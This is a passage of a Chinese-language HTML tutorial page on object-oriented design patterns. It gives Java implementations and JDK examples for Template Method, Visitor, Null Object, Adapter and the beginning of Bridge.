punctuation">(</span><span class="token string">"Coffee.brew"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">addCondiments</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Coffee.addCondiments"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Tea</span> <span class="token keyword">extends</span> <span class="token class-name">CaffeineBeverage</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">brew</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Tea.brew"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">addCondiments</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Tea.addCondiments"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        CaffeineBeverage caffeineBeverage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Coffee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        caffeineBeverage<span class="token punctuation">.</span><span class="token function">prepareRecipe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        caffeineBeverage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        caffeineBeverage<span class="token punctuation">.</span><span class="token function">prepareRecipe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>boilWaterCoffee<span class="token punctuation">.</span>brewpourInCupCoffee<span class="token punctuation">.</span>addCondiments<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>boilWaterTea<span class="token punctuation">.</span>brewpourInCupTea<span class="token punctuation">.</span>addCondiments</code></pre><h3 id="JDK-13"><a href="#JDK-13" class="headerlink" title="JDK"></a>JDK</h3><ul><li>java.util.Collections#sort()</li><li>java.io.InputStream#skip()</li><li>java.io.InputStream#read()</li><li>java.util.AbstractList#indexOf()</li></ul><h2 id="11-访问者（Visitor）"><a href="#11-访问者（Visitor）" class="headerlink" title="11. 访问者（Visitor）"></a>11. 访问者（Visitor）</h2><h3 id="Intent-16"><a href="#Intent-16" class="headerlink" title="Intent"></a>Intent</h3><p>为一个对象结构（比如组合结构）增加新能力。</p><h3 id="Class-Diagram-16"><a href="#Class-Diagram-16" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Visitor：访问者，为每一个 ConcreteElement 声明一个 visit 操作</li><li>ConcreteVisitor：具体访问者，存储遍历过程中的累计结果</li><li>ObjectStructure：对象结构，可以是组合结构，或者是一个集合。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/ec923dc7-864c-47b0-a411-1f2c48d084de.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/ec923dc7-864c-47b0-a411-1f2c48d084de.png" alt="img"></a></p><h3 id="Implementation-16"><a href="#Implementation-16" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Element</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">accept</span><span class="token punctuation">(</span>Visitor visitor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CustomerGroup</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>Customer<span class="token operator">></span> customers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">accept</span><span class="token punctuation">(</span>Visitor visitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Customer customer <span class="token operator">:</span> customers<span class="token punctuation">)</span> <span class="token punctuation">{</span>            customer<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>visitor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">void</span> <span class="token function">addCustomer</span><span class="token punctuation">(</span>Customer customer<span class="token punctuation">)</span> <span class="token punctuation">{</span>        customers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>customer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Customer</span> <span class="token keyword">implements</span> <span class="token class-name">Element</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>Order<span class="token operator">></span> orders <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Customer</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">void</span> <span class="token function">addOrder</span><span class="token punctuation">(</span>Order order<span class="token punctuation">)</span> <span class="token punctuation">{</span>        orders<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accept</span><span class="token punctuation">(</span>Visitor visitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>        visitor<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Order order <span class="token operator">:</span> orders<span class="token punctuation">)</span> <span class="token punctuation">{</span>            order<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>visitor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Order</span> <span class="token keyword">implements</span> <span class="token class-name">Element</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>Item<span class="token operator">></span> items <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Order</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">Order</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String itemName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Item</span><span class="token punctuation">(</span>itemName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">void</span> <span class="token function">addItem</span><span class="token punctuation">(</span>Item item<span class="token punctuation">)</span> <span class="token punctuation">{</span>        items<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accept</span><span class="token punctuation">(</span>Visitor visitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>        visitor<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Item item <span class="token operator">:</span> items<span class="token punctuation">)</span> <span class="token punctuation">{</span>            item<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>visitor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Item</span> <span class="token keyword">implements</span> <span class="token class-name">Element</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token function">Item</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accept</span><span class="token punctuation">(</span>Visitor visitor<span class="token punctuation">)</span> <span class="token punctuation">{</span>        visitor<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Visitor</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span>Customer customer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span>Order order<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span>Item item<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GeneralReport</span> <span class="token keyword">implements</span> <span class="token class-name">Visitor</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> customersNo<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> ordersNo<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> itemsNo<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span>Customer customer<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>customer<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customersNo<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span>Order order<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>order<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ordersNo<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span>Item item<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        itemsNo<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">displayResults</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Number of customers: "</span> <span class="token operator">+</span> customersNo<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Number of orders:    "</span> <span class="token operator">+</span> ordersNo<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Number of items:     "</span> <span class="token operator">+</span> itemsNo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Customer customer1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Customer</span><span class="token punctuation">(</span><span class="token string">"customer1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customer1<span class="token punctuation">.</span><span class="token function">addOrder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Order</span><span class="token punctuation">(</span><span class="token string">"order1"</span><span class="token punctuation">,</span> <span class="token string">"item1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customer1<span class="token punctuation">.</span><span class="token function">addOrder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Order</span><span class="token punctuation">(</span><span class="token string">"order2"</span><span class="token punctuation">,</span> <span class="token string">"item1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customer1<span class="token punctuation">.</span><span class="token function">addOrder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Order</span><span class="token punctuation">(</span><span class="token string">"order3"</span><span class="token punctuation">,</span> <span class="token string">"item1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Order order <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Order</span><span class="token punctuation">(</span><span class="token string">"order_a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        order<span class="token punctuation">.</span><span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Item</span><span class="token punctuation">(</span><span class="token string">"item_a1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        order<span class="token punctuation">.</span><span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Item</span><span class="token punctuation">(</span><span class="token string">"item_a2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        order<span class="token punctuation">.</span><span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Item</span><span class="token punctuation">(</span><span class="token string">"item_a3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Customer customer2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Customer</span><span class="token punctuation">(</span><span class="token string">"customer2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customer2<span class="token punctuation">.</span><span class="token function">addOrder</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>        CustomerGroup customers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CustomerGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customers<span class="token punctuation">.</span><span class="token function">addCustomer</span><span class="token punctuation">(</span>customer1<span class="token punctuation">)</span><span class="token punctuation">;</span>        customers<span class="token punctuation">.</span><span class="token function">addCustomer</span><span class="token punctuation">(</span>customer2<span class="token punctuation">)</span><span class="token punctuation">;</span>        GeneralReport visitor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GeneralReport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customers<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>visitor<span class="token punctuation">)</span><span class="token punctuation">;</span>        visitor<span class="token punctuation">.</span><span class="token function">displayResults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>customer1order1item1order2item1order3item1customer2order_aitem_a1item_a2item_a3Number of customers<span class="token operator">:</span> <span class="token number">2</span>Number of orders<span class="token operator">:</span>    <span class="token number">4</span>Number of items<span class="token operator">:</span>     <span class="token number">6</span></code></pre><h3 id="JDK-14"><a href="#JDK-14" class="headerlink" title="JDK"></a>JDK</h3><ul><li>javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor</li><li>javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor</li></ul><h2 id="12-空对象（Null）"><a href="#12-空对象（Null）" class="headerlink" title="12. 空对象（Null）"></a>12. 空对象（Null）</h2><h3 id="Intent-17"><a href="#Intent-17" class="headerlink" title="Intent"></a>Intent</h3><p>使用什么都不做的空对象来代替 NULL。</p><p>一个方法返回 NULL，意味着方法的调用端需要去检查返回值是否是 NULL，这么做会导致非常多的冗余的检查代码。并且如果某一个调用端忘记了做这个检查返回值，而直接使用返回的对象，那么就有可能抛出空指针异常。</p><h3 id="Class-Diagram-17"><a href="#Class-Diagram-17" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/dd3b289c-d90e-44a6-a44c-4880517eb1de.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/dd3b289c-d90e-44a6-a44c-4880517eb1de.png" alt="img"></a></p><h3 id="Implementation-17"><a href="#Implementation-17" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractOperation</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RealOperation</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractOperation</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"do something"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NullOperation</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractOperation</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// do nothing</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        AbstractOperation abstractOperation <span class="token operator">=</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        abstractOperation<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> AbstractOperation <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> para<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>para <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">NullOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RealOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="四、结构型"><a href="#四、结构型" class="headerlink" title="四、结构型"></a>四、结构型</h1><h2 id="1-适配器（Adapter）"><a href="#1-适配器（Adapter）" class="headerlink" title="1. 适配器（Adapter）"></a>1. 适配器（Adapter）</h2><h3 id="Intent-18"><a href="#Intent-18" class="headerlink" title="Intent"></a>Intent</h3><p>把一个类接口转换成另一个用户需要的接口。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/3d5b828e-5c4d-48d8-a440-281e4a8e1c92.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/3d5b828e-5c4d-48d8-a440-281e4a8e1c92.png" alt="img"></a></p><h3 id="Class-Diagram-18"><a href="#Class-Diagram-18" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/0889c0b4-07b4-45fc-873c-e0e16b97f67d.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/0889c0b4-07b4-45fc-873c-e0e16b97f67d.png" alt="img"></a></p><h3 id="Implementation-18"><a href="#Implementation-18" class="headerlink" title="Implementation"></a>Implementation</h3><p>鸭子（Duck）和火鸡（Turkey）拥有不同的叫声，Duck 的叫声调用 quack() 方法，而 Turkey 调用 gobble() 方法。</p><p>要求将 Turkey 的 gobble() 方法适配成 Duck 的 quack() 方法，从而让火鸡冒充鸭子！</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Duck</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">quack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Turkey</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">gobble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WildTurkey</span> <span class="token keyword">implements</span> <span class="token class-name">Turkey</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">gobble</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"gobble!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TurkeyAdapter</span> <span class="token keyword">implements</span> <span class="token class-name">Duck</span> <span class="token punctuation">{</span>    Turkey turkey<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">TurkeyAdapter</span><span class="token punctuation">(</span>Turkey turkey<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>turkey <span class="token operator">=</span> turkey<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">quack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        turkey<span class="token punctuation">.</span><span class="token function">gobble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Turkey turkey <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WildTurkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Duck duck <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TurkeyAdapter</span><span class="token punctuation">(</span>turkey<span class="token punctuation">)</span><span class="token punctuation">;</span>        duck<span class="token punctuation">.</span><span class="token function">quack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="JDK-15"><a href="#JDK-15" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Arrays.html#asList%28T...%29" target="_blank" rel="noopener">java.util.Arrays#asList()</a></li><li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#list-java.util.Enumeration-" target="_blank" rel="noopener">java.util.Collections#list()</a></li><li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#enumeration-java.util.Collection-" target="_blank" rel="noopener">java.util.Collections#enumeration()</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/bind/annotation/adapters/XmlAdapter.html#marshal-BoundType-" target="_blank" rel="noopener">javax.xml.bind.annotation.adapters.XMLAdapter</a></li></ul><h2 id="2-桥接（Bridge）"><a href="#2-桥接（Bridge）" class="headerlink" title="2. 桥接（Bridge）"></a>2. 桥接（Bridge）</h2><h3 id="Intent-19"><a href="#Intent-19" class="headerlink" title="Intent"></a>Intent</h3><p>将抽象与实现分离开来，使它们可以独立变化。</p><h3 id="Class-Diagram-19"><a href="#Class-Diagram-19" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Abstraction：定义抽象类的接口</li><li>Implementor：定义实现类接口</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c2cbf5d2-82af-4c78-bd43-495da5adf55f.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c2cbf5d2-82af-4c78-bd43-495da5adf55f.png" alt="img"></a></p><h3 id="Implementation-19"><a href="#Implementation-19" class="headerlink" title="Implementation"></a>Implementation</h3><p>RemoteControl 表示遥控器，指代 Abstraction。</p><p>TV 表示电视，指代 Implementor。</p><p>桥接模式将遥控器和电视分离开来，从而可以独立改变遥控器或者电视的实现。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">TV</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 